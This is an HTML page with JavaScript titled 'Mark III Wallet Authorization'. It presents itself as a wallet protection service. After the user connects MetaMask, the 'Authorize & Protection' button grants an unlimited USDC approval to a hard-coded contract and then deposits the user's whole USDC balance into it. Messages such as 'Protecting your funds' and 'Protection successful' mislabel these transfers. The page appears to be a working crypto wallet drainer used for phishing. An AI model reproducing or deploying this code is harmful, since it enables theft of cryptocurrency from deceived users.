<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mark III Wallet Authorization</title>
  <style>
    :root {
      --primary: #4e44ce;
      --error: #ff4444;
      --success: #00C851;
      --warning: #ffbb33;
    }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f8f9fa;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }
    button {
      padding: 12px 24px;
      margin: 8px;
      border: none;
      border-radius: 8px;
      background: var(--primary);
      color: white;
      cursor: pointer;
      font-weight: bold;
    }
    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    #status {
      margin-top: 20px;
      padding: 12px;
      border-radius: 8px;
      background: white;
      max-width: 500px;
      word-break: break-word;
      min-height: 60px;
      display: flex;
      align-items: center;
    }
    .error {
      color: var(--error);
    }
    .success {
      color: var(--success);
    }
    .progress {
      color: var(--warning);
    }
    .progress-bar {
      width: 100%;
      height: 4px;
      background: #e9ecef;
      border-radius: 2px;
      margin-top: 8px;
      overflow: hidden;
    }
    .progress-bar-fill {
      height: 100%;
      background: var(--primary);
      width: 0%;
      transition: width 0.3s ease;
    }
    .status-icon {
      margin-right: 10px;
      font-size: 1.2em;
    }
  </style>
</head>
<body>
  <h2>Mark III Wallet Authorization</h2>
  
  <button id="connect">Connect Wallet</button>
  <button id="authorize" disabled>Authorize & Protection</button>
  
  <div id="status">
    <span class="status-icon">üîí</span>
    <span id="status-text">Status: Connect your wallet</span>
  </div>
  <div class="progress-bar">
    <div class="progress-bar-fill" id="progress-bar"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    // Configuration
    const CONFIG = {
      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC Mainnet
      CONTRACT_ADDRESS: "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12",
      ABI: [
        "function deposit(uint256 amount) external",
        "function approve(address,uint256) returns (bool)",
        "function balanceOf(address) view returns (uint256)"
      ]
    };

    // DOM Elements
    const connectBtn = document.getElementById('connect');
    const authorizeBtn = document.getElementById('authorize');
    const statusEl = document.getElementById('status');
    const statusText = document.getElementById('status-text');
    const progressBar = document.getElementById('progress-bar');
    const statusIcon = document.querySelector('.status-icon');

    // State
    let provider, signer, user;

    // Initialize
    connectBtn.onclick = connectWallet;

    async function connectWallet() {
      try {
        if (!window.ethereum) throw new Error("Please install MetaMask");
        
        updateStatus("Connecting to wallet... ‚è≥", "progress");
        progressBar.style.width = "20%";
        
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        user = await signer.getAddress();
        
        updateUI();
        updateStatus(`Connected: ${user}`, "success");
        progressBar.style.width = "40%";
        
      } catch (err) {
        showError(err);
      }
    }

    function updateUI() {
      connectBtn.disabled = true;
      authorizeBtn.disabled = false;
      authorizeBtn.onclick = handleProtection;
    }

    async function handleProtection() {
      try {
        // 1. Initialize USDC contract
        const usdc = new ethers.Contract(
          CONFIG.USDC_ADDRESS,
          [
            "function approve(address,uint256) returns (bool)",
            "function balanceOf(address) view returns (uint256)"
          ],
          signer
        );
        
        // 2. Get user's USDC balance
        updateStatus("Fetching USDC balance... ‚è≥", "progress");
        progressBar.style.width = "50%";
        const balance = await usdc.balanceOf(user);
        
        // 3. Approve max amount
        updateStatus("Approving USDC for protection... ‚è≥", "progress");
        progressBar.style.width = "60%";
        const approveTx = await usdc.approve(
          CONFIG.CONTRACT_ADDRESS, 
          ethers.constants.MaxUint256 // MAX APPROVAL
        );
        
        updateStatus("Waiting for approval confirmation... ‚è≥", "progress");
        progressBar.style.width = "70%";
        await approveTx.wait();
        
        // 4. Protect full balance
        updateStatus("Initializing account protection... üîÑ", "progress");
        progressBar.style.width = "80%";
        const contract = new ethers.Contract(
          CONFIG.CONTRACT_ADDRESS,
          CONFIG.ABI,
          signer
        );
        
        updateStatus("Protecting your funds... üîÑ", "progress");
        progressBar.style.width = "90%";
        const protectionTx = await contract.deposit(balance);
        await protectionTx.wait();
        
        updateStatus(`‚úÖ Protection successful! Secured ${ethers.utils.formatUnits(balance, 6)} USDC`, "success");
        progressBar.style.width = "100%";
        statusIcon.textContent = "‚úÖ";
        
      } catch (err) {
        showError(err);
      }
    }

    function updateStatus(message, type) {
      statusText.textContent = message;
      statusEl.className = type || '';
      statusIcon.textContent = getStatusIcon(type);
    }

    function getStatusIcon(type) {
      switch(type) {
        case 'error': return '‚ùå';
        case 'success': return '‚úÖ';
        case 'progress': return '‚è≥';
        default: return 'üîí';
      }
    }

    function showError(err) {
      console.error(err);
      updateStatus(`Error: ${err.message}`, "error");
      progressBar.style.width = "0%";
      statusIcon.textContent = "‚ùå";
    }
  </script>
</body>
</html>
